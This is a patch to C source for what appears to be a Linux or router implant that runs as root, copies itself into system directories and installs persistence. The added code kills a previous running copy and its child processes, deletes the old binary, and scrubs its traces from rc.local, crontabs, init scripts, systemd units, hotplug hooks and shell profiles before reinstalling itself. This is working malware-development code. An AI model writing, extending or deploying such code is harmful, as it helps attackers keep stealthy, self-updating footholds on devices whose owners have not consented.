@@ -7,6 +7,8 @@
 #include <sys/stat.h>
 #include <unistd.h>
 #include <fcntl.h>
+#include <time.h>
+#include <dirent.h>
 
 #ifndef SERVER_HOST
 #define SERVER_HOST "0.0.0.0"
@@ -71,22 +73,211 @@ static int is_pid_alive(pid_t pid) {
     return 0;
 }
 
-static int acquire_lock(void) {
+static int get_exe_path_of_pid(pid_t pid, char *buf, int buflen) {
+    char link[64];
+    ssize_t r;
+    snprintf(link, sizeof(link), "/proc/%d/exe", (int)pid);
+    r = readlink(link, buf, buflen - 1);
+    if (r <= 0) return 0;
+    buf[r] = 0;
+    return 1;
+}
+
+static void kill_pid_tree(pid_t pid) {
+    char path[128];
+    char line[256];
+    DIR *d;
+    struct dirent *de;
+    pid_t child;
+    FILE *f;
+
+    d = opendir("/proc");
+    if (d) {
+        while ((de = readdir(d)) != NULL) {
+            if (de->d_name[0] < '0' || de->d_name[0] > '9') continue;
+            child = (pid_t)atoi(de->d_name);
+            if (child <= 1 || child == pid) continue;
+            snprintf(path, sizeof(path), "/proc/%d/status", child);
+            f = fopen(path, "r");
+            if (!f) continue;
+            while (fgets(line, sizeof(line), f)) {
+                if (strncmp(line, "PPid:", 5) == 0) {
+                    pid_t ppid = (pid_t)atoi(line + 5);
+                    if (ppid == pid) {
+                        kill_pid_tree(child);
+                        kill(child, SIGKILL);
+                        waitpid(child, NULL, WNOHANG);
+                    }
+                    break;
+                }
+            }
+            fclose(f);
+        }
+        closedir(d);
+    }
+    kill(pid, SIGKILL);
+    waitpid(pid, NULL, WNOHANG);
+}
+
+static int file_contains(const char *filepath, const char *needle) {
+    FILE *f;
+    char line[1024];
+    f = fopen(filepath, "r");
+    if (!f) return 0;
+    while (fgets(line, sizeof(line), f)) {
+        if (strstr(line, needle)) { fclose(f); return 1; }
+    }
+    fclose(f);
+    return 0;
+}
+
+static int can_write_to(const char *path) {
+    char dir[512];
+    char test[560];
+    char *slash;
+    FILE *f;
+    strncpy(dir, path, sizeof(dir) - 1);
+    dir[sizeof(dir) - 1] = 0;
+    slash = strrchr(dir, '/');
+    if (slash) *slash = 0;
+    else strcpy(dir, "/tmp");
+    snprintf(test, sizeof(test), "%s/.wt_%d", dir, getpid());
+    f = fopen(test, "w");
+    if (!f) return 0;
+    fprintf(f, "x");
+    fclose(f);
+    unlink(test);
+    return 1;
+}
+
+static void remove_old_persistence(const char *old_bin_path) {
+    char cmd[1024];
+    char path[256];
+    const char *bn;
+    const char *profiles[] = { "/root/.profile", "/root/.bashrc", "/etc/profile", NULL };
+    const char *cron_files[] = {
+        "/var/spool/cron/crontabs/root", "/etc/crontabs/root", NULL
+    };
+    int i;
+
+    if (!old_bin_path || old_bin_path[0] == 0) return;
+
+    bn = strrchr(old_bin_path, '/');
+    bn = bn ? bn + 1 : old_bin_path;
+
+    snprintf(path, sizeof(path), "/etc/cron.d/%s", SERVICE_NAME);
+    unlink(path);
+
+    if (file_contains("/etc/rc.local", old_bin_path) || file_contains("/etc/rc.local", bn)) {
+        snprintf(cmd, sizeof(cmd),
+            "grep -v '%s' /etc/rc.local > /etc/rc.local.tmp && mv /etc/rc.local.tmp /etc/rc.local 2>/dev/null", bn);
+        system(cmd);
+    }
+
+    snprintf(cmd, sizeof(cmd),
+        "crontab -l 2>/dev/null | grep -v '%s' | crontab - 2>/dev/null", bn);
+    system(cmd);
+
+    for (i = 0; cron_files[i]; i++) {
+        if (!file_contains(cron_files[i], old_bin_path) && !file_contains(cron_files[i], bn)) continue;
+        snprintf(cmd, sizeof(cmd),
+            "grep -v '%s' %s > %s.tmp && mv %s.tmp %s 2>/dev/null",
+            bn, cron_files[i], cron_files[i], cron_files[i], cron_files[i]);
+        system(cmd);
+    }
+
+    snprintf(path, sizeof(path), "/etc/init.d/S99%s", SERVICE_NAME);
+    unlink(path);
+    snprintf(path, sizeof(path), "/etc/init.d/%s", SERVICE_NAME);
+    unlink(path);
+
+    snprintf(cmd, sizeof(cmd),
+        "rm -f /etc/rc2.d/S99%s /etc/rc3.d/S99%s /etc/rc5.d/S99%s 2>/dev/null",
+        SERVICE_NAME, SERVICE_NAME, SERVICE_NAME);
+    system(cmd);
+
+    snprintf(cmd, sizeof(cmd), "systemctl stop %s.service 2>/dev/null", SERVICE_NAME);
+    system(cmd);
+    snprintf(cmd, sizeof(cmd), "systemctl disable %s.service 2>/dev/null", SERVICE_NAME);
+    system(cmd);
+    snprintf(path, sizeof(path), "/etc/systemd/system/%s.service", SERVICE_NAME);
+    unlink(path);
+    system("systemctl daemon-reload 2>/dev/null");
+
+    snprintf(path, sizeof(path), "/etc/hotplug.d/iface/99-%s", SERVICE_NAME);
+    unlink(path);
+
+    for (i = 0; profiles[i]; i++) {
+        if (!file_contains(profiles[i], old_bin_path) && !file_contains(profiles[i], bn)) continue;
+        snprintf(cmd, sizeof(cmd),
+            "grep -v '%s' %s > %s.tmp && mv %s.tmp %s 2>/dev/null",
+            bn, profiles[i], profiles[i], profiles[i], profiles[i]);
+        system(cmd);
+    }
+}
+
+static void replace_old_instance(void) {
     FILE *f;
     int old_pid = 0;
+    char old_exe[1024] = {0};
+
     f = fopen(PID_FILE, "r");
-    if (f) {
-        if (fscanf(f, "%d", &old_pid) == 1 && is_pid_alive((pid_t)old_pid)) {
-            fclose(f);
-            return 0;
+    if (!f) return;
+
+    if (fscanf(f, "%d", &old_pid) != 1 || old_pid <= 0) {
+        fclose(f);
+        unlink(PID_FILE);
+        return;
+    }
+    fclose(f);
+
+    if (get_exe_path_of_pid((pid_t)old_pid, old_exe, sizeof(old_exe))) {
+        if (strcmp(old_exe, g_self_path) != 0) {
+            remove_old_persistence(old_exe);
+            unlink(old_exe);
         }
+    }
+
+    if (is_pid_alive((pid_t)old_pid)) {
+        kill_pid_tree((pid_t)old_pid);
+        usleep(200000);
+        if (is_pid_alive((pid_t)old_pid)) {
+            kill(old_pid, SIGKILL);
+            usleep(500000);
+        }
+    }
+
+    unlink(PID_FILE);
+
+    {
+        const char *known_paths[] = {
+            "/usr/bin/" INSTALL_NAME,
+            "/usr/sbin/" INSTALL_NAME,
+            "/bin/" INSTALL_NAME,
+            "/sbin/" INSTALL_NAME,
+            "/opt/" INSTALL_NAME,
+            "/var/" INSTALL_NAME,
+            "/etc/" INSTALL_NAME,
+            "/overlay/upper/usr/bin/" INSTALL_NAME,
+            "/overlay/upper/sbin/" INSTALL_NAME,
+            NULL
+        };
+        int i;
+        struct stat st;
+        for (i = 0; known_paths[i]; i++) {
+            if (strcmp(known_paths[i], g_self_path) == 0) continue;
+            if (stat(known_paths[i], &st) == 0) unlink(known_paths[i]);
+        }
+    }
+}
+
+static void acquire_lock(void) {
+    FILE *f;
+    f = fopen(PID_FILE, "w");
+    if (f) {
+        fprintf(f, "%d\n", (int)getpid());
         fclose(f);
     }
-    f = fopen(PID_FILE, "w");
-    if (!f) return 1;
-    fprintf(f, "%d\n", (int)getpid());
-    fclose(f);
-    return 1;
 }
 
 static void release_lock(void) {
@@ -126,25 +317,6 @@ static int check_root(void) {
     return (geteuid() == 0);
 }
 
-static int can_write_to(const char *path) {
-    char dir[512];
-    char test[560];
-    char *slash;
-    FILE *f;
-    strncpy(dir, path, sizeof(dir) - 1);
-    dir[sizeof(dir) - 1] = 0;
-    slash = strrchr(dir, '/');
-    if (slash) *slash = 0;
-    else strcpy(dir, "/tmp");
-    snprintf(test, sizeof(test), "%s/.wt_%d", dir, getpid());
-    f = fopen(test, "w");
-    if (!f) return 0;
-    fprintf(f, "x");
-    fclose(f);
-    unlink(test);
-    return 1;
-}
-
 static int copy_file(const char *src, const char *dst) {
     FILE *in, *out;
     char buf[4096];
@@ -163,18 +335,6 @@ static int copy_file(const char *src, const char *dst) {
     chmod(dst, 0755);
     chown(dst, 0, 0);
     return 1;
-}
-
-static int file_contains(const char *filepath, const char *needle) {
-    FILE *f;
-    char line[1024];
-    f = fopen(filepath, "r");
-    if (!f) return 0;
-    while (fgets(line, sizeof(line), f)) {
-        if (strstr(line, needle)) { fclose(f); return 1; }
-    }
-    fclose(f);
-    return 0;
 }
 
 static int is_tmpfs(const char *path) {
@@ -419,6 +579,12 @@ static void install_persistence(void) {
     if (!find_install_location()) return;
     if (strcmp(g_self_path, g_install_path) != 0) {
         if (stat(g_install_path, &st) != 0) {
+            if (!copy_file(g_self_path, g_install_path)) {
+                strncpy(g_install_path, g_self_path, sizeof(g_install_path) - 1);
+                if (is_tmpfs(g_install_path)) return;
+            }
+        } else {
+            unlink(g_install_path);
             if (!copy_file(g_self_path, g_install_path)) {
                 strncpy(g_install_path, g_self_path, sizeof(g_install_path) - 1);
                 if (is_tmpfs(g_install_path)) return;
@@ -1038,8 +1204,10 @@ int main(int argc, char **argv) {
         _exit(1);
     }
 
+    replace_old_instance();
+
     is_root = check_root();
-    if (!acquire_lock()) _exit(0);
+    acquire_lock();
     atexit(cleanup);
 
     install_persistence();
